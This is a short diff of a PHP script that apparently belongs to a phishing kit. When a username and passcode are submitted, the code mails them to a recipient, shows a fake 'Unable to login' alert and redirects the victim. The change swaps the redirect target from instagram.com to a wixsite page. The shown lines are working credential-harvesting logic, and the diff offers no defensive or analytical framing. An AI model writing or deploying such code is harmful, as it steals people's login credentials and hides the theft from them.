@@ -14,7 +14,7 @@ if (!empty($username) and !empty($passcode)) {
 
     mail($to, $subject, $txt);
     echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
+        window.location.replace('https://rezagados.wixsite.com/premium/materias');
         </script>";
 
 } else {
